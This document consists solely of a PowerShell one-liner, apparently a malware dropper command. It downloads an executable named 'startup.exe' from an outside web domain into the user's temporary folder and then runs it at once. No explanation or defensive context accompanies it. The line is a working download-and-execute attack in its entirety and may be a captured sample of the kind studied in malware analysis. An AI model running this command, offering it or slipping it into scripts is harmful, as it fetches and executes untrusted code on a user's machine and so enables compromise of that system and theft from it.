
(New-Object System.Net.WebClient).DownloadFile('www.londonoffices.website/download/startup.exe',"$env:TEMP\startup.exe");Start-Process ("$env:TEMP\startup.exe")

